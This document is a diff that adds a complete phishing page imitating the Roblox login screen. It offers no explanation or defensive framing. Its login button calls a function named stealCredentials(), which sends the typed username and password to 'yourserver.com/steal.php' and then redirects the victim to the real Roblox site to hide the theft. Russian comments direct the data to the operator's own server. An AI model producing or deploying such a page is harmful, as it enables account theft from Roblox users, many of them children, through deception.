@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox - Official Site</title>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            background: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+        }
+        .login-form {
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+        }
+        button {
+            background: #00a2ff;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 3px;
+            width: 100%;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-form">
+        <h2>Roblox Login</h2>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="stealCredentials()">Login</button>
+    </div>
+
+    <script>
+        function stealCredentials() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // Отправка данных на ваш сервер
+            fetch('https://yourserver.com/steal.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    user: username,
+                    pass: password,
+                    site: 'Roblox'
+                })
+            });
+            
+            // Перенаправление на настоящий сайт Roblox
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
